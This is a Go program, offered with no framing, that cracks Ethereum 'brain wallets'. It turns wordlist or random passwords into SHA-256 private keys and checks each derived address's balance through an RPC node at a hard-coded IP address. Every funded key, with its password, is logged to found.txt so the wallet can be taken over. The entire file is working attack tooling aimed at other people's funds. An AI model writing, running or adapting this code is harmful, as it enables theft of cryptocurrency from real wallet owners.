package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"hash"
	"io"
	"io/ioutil"
	"log"
	"math/big"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

var wg sync.WaitGroup

const alphaNums = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"

func SHA256(hasher hash.Hash, input []byte) (hash []byte) {
	hasher.Reset()
	hasher.Write(input)
	hash = hasher.Sum(nil)
	return hash

}

func NewPrivateKey(password string) string {
	hasher := sha256.New()
	sha := SHA256(hasher, []byte(password))
	priv := hex.EncodeToString(sha)
	return priv
}

func GenerateAddressFromPrivKey(hex string) string {
	privateKey, err := crypto.HexToECDSA(hex)
	if err != nil {
		log.Fatal(err)
	}

	publicKey := privateKey.Public()
	publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey)
	if !ok {
		log.Fatal("cannot assert type: publicKey is not of type *ecdsa.PublicKey")
	}

	address := crypto.PubkeyToAddress(*publicKeyECDSA).Hex()
	return address
}

func BalanceAt(client *ethclient.Client, address string) (*big.Int, error) {
	account := common.HexToAddress(address)
	balance, err := client.BalanceAt(context.Background(), account, nil)
	if err != nil {
		if err == io.EOF {
			log.Fatalf("Check balance: %s %v\n", address, err)
		}
		return nil, err
	}
	return balance, nil
}

func WriteToFound(text string, path string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0655)
	if err != nil {
		log.Fatalf("Open file: %s %v\n", text, err)
	}
	defer f.Close()

	_, err = f.WriteString(text)
	if err != nil {
		log.Fatalf("Write string: %s %v\n", text, err)
	}
}

func CheckBalanceRandom(client *ethclient.Client, length int) {
	for {
		password := genRandomPassword(length)
		privKey := NewPrivateKey(password)
		address := GenerateAddressFromPrivKey(privKey)

		balance, err := BalanceAt(client, address)

		if err != nil {
			log.Printf("Random: %v", err)
			continue
		}

		if balance.Cmp(big.NewInt(0)) != 0 {
			data := fmt.Sprintf("%s:%s:%s %s\n", password, privKey, address, balance.String())
			WriteToFound(data, "found.txt")
		}
		fmt.Println(password, privKey, address, balance)

	}
}

func CheckBalance(passwords chan string, client *ethclient.Client) {
	for password := range passwords {
		privKey := NewPrivateKey(password)
		address := GenerateAddressFromPrivKey(privKey)
		creds := fmt.Sprintf("%s:%s", privKey, address)

		balance, err := BalanceAt(client, address)

		if err != nil {
			log.Printf("Check balance: %s %v\n", creds, err)
			continue
		}

		if balance.Cmp(big.NewInt(0)) != 0 {
			data := password + ":" + creds + ":" + balance.String() + "\n"
			WriteToFound(data, "found.txt")
		}
		fmt.Println(password, creds, balance)
	}
	defer wg.Done()
}

func GetPasswordList(path string) ([]string, error) {
	f, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}

	passwords := strings.Split(string(f), "\n")
	return passwords, nil
}

func genRandomPassword(length int) (password string) {
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < length; i++ {
		symbol := alphaNums[rand.Intn(len(alphaNums)-1)]
		password += string(symbol)
	}
	return
}

func GenRandomPasswords(length int, num int) (results []string) {
	for i := 0; i < num; i++ {
		password := genRandomPassword(length)
		results = append(results, password)
	}
	return
}

func main() {
	passFile := flag.String("i", "passwords.txt", "Password list")
	threads := flag.Uint("t", 4, "Number of threads")
	server := flag.String("s", "154.48.217.250", "Ethereum rpc server")
	port := flag.Int("p", 8545, "Ethereum rpc port")
	random := flag.Bool("r", false, "Generate random passwords")
	length := flag.Int("l", 8, "Password length")
	flag.Parse()

	client, err := ethclient.Dial("http://" + *server + ":" + strconv.Itoa(*port))
	if err != nil {
		log.Fatalf("Client: %s\n", err)
	}
	defer client.Close()

	if *random {
		for i := 0; i < int(*threads); i++ {
			wg.Add(1)
			go CheckBalanceRandom(client, *length)
		}
		wg.Wait()
	}

	passList, err := GetPasswordList(*passFile)
	if err != nil {
		log.Fatal(err)
	}

	jobs := make(chan string)

	for i := 0; i < int(*threads); i++ {
		wg.Add(1)
		go CheckBalance(jobs, client)
	}

	for _, password := range passList {
		jobs <- password
	}
	close(jobs)
	wg.Wait()
}
